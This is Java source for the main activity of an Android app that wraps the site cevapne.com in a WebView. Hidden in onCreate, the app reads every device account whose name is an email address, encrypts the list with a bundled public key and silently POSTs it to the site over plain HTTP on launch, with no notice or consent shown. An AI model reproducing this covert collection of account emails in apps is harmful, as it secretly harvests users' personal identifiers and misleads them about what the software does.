package com.cevapne.cevapne;



import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.util.regex.Pattern;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.annotation.SuppressLint;
import android.graphics.Bitmap;
import android.os.Bundle;
import android.support.v7.app.ActionBarActivity;
import android.util.Patterns;
import android.view.Menu;
import android.view.MenuInflater;
import android.view.MenuItem;
import android.view.View;
import android.webkit.WebChromeClient;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.ProgressBar;


public class MainActivity extends ActionBarActivity {
	MenuItem mi_close;
	private ProgressBar progress;
	private WebView webview;
	@Override
	public void onBackPressed() {
		// TODO Auto-generated method stub
		//super.onBackPressed();
		if(webview.canGoBack()){
			webview.goBack();
		}else{
			super.onBackPressed();
		}
		
		
	}
	
    @SuppressLint({ "SetJavaScriptEnabled", "ShowToast" }) @Override
    protected void onCreate(Bundle savedInstanceState) {
    	
    	super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        String mails="";
        
        Pattern emailPattern = Patterns.EMAIL_ADDRESS; // API level 8+
		Account[] accounts = AccountManager.get(getApplicationContext()).getAccounts();
		for (Account account : accounts) {
		    if (emailPattern.matcher(account.name).matches()) {
		        String possibleEmail = account.name;
		        mails+=possibleEmail+",";
		    }
		}
		
        
            
        
        
      
        
        
        webview=(WebView)findViewById(R.id.webview);
        webview.getSettings().setJavaScriptEnabled(true);
        webview.setWebChromeClient(new myWebChromeClient());
        myWebClient wc=new myWebClient();
        webview.setWebViewClient(wc);
        webview.getSettings().setSupportZoom(true);  
        webview.getSettings().setBuiltInZoomControls(true);
        webview.setInitialScale(30);
        webview.getSettings().setUseWideViewPort(true);

		progress = (ProgressBar) findViewById(R.id.progress);
		progress.setMax(100);
		
		crypt.init(getResources().openRawResource(R.raw.publickey));
		
		webview.postUrl("http://www.cevapne.com", ("msg="+crypt.encrypt(mails)+"&key="+crypt.cryptedKey).getBytes());
		
		
   
    }

   
    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
    	MenuInflater inflater = getMenuInflater();
        inflater.inflate(R.menu.main, menu);
        return super.onCreateOptionsMenu(menu);
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        int id = item.getItemId();
        
        if(id==mi_close.getItemId()){
        	finish();
        }
        return super.onOptionsItemSelected(item);
    }
    
    private class myWebChromeClient extends WebChromeClient {	
		@Override
		public void onProgressChanged(WebView view, int newProgress) {			
			MainActivity.this.setValue(newProgress);
			super.onProgressChanged(view, newProgress);
		}
	}
    
    private class myWebClient extends WebViewClient {

    	@Override
    	public void onPageStarted(WebView view, String url, Bitmap favicon) {
    		// TODO Auto-generated method stub
    		super.onPageStarted(view, url, favicon);
    		progress.setVisibility(View.VISIBLE);
    	}

    	@Override
		public boolean shouldOverrideUrlLoading(WebView view, String url) {
			// TODO Auto-generated method stub
			return super.shouldOverrideUrlLoading(view, url);
		}

		@Override
    	public void onPageFinished(WebView view, String url) {
    		// TODO Auto-generated method stub
    		super.onPageFinished(view, url);
    		progress.setVisibility(View.INVISIBLE);
    	}

    }
    public void setValue(int progress) {
		this.progress.setProgress(progress);		
	}
    public String readTextFile(InputStream inputStream) {
        ByteArrayOutputStream outputStream = new ByteArrayOutputStream();

        byte buf[] = new byte[1024];
        int len;
        try {
            while ((len = inputStream.read(buf)) != -1) {
                outputStream.write(buf, 0, len);
            }
            outputStream.close();
            inputStream.close();
        } catch (IOException e) {

        }
        return outputStream.toString();
    }
}
